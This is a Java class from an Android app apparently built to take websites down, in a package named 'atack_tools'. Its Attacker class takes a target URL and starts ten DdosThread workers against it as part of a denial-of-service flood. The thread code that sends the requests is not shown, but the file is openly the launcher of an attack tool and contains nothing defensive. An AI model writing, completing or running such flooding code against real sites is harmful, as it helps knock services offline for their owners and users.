package com.example.ipdownapp.atack_tools;

import android.util.Log;

import androidx.annotation.Nullable;

import com.example.ipdownapp.activitys.DDOSActivity;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.concurrent.atomic.AtomicBoolean;

public class Attacker {

    private int num_threadsDDOS;

    public Attacker(String url_request, int num_threads, Notificable notificable) throws Exception {

        //va a setear el atributo estatico notificable de los DdosThread

        DdosThread.notificable = notificable;

        //this.num_threads = num_threads;
        this.num_threadsDDOS = 10;
        for (int i = 0; i < this.num_threadsDDOS; i++) {
            DdosThread thread = new DdosThread();
            thread.setRequestURL(url_request);
            thread.start();
        }
    }

}
